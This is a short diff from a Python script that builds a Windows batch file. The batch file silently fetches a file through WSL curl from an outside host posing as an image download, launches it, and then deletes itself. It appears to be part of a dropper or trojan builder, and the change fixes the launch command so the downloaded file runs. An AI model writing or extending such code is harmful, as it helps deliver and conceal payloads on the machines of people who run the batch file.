@@ -153,7 +153,7 @@ def proceed():
     # Creates the batfile
     batfile = batfile_template[:]
     batfile += f'''\nwsl bash -c "curl -s -X POST -o '{original_filename}' https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
-    batfile += f'''\nstart "{original_filename}"'''
+    batfile += f'''\nstart "" "{original_filename}"'''
 
     # Batfile self deletes
     batfile += del_exe
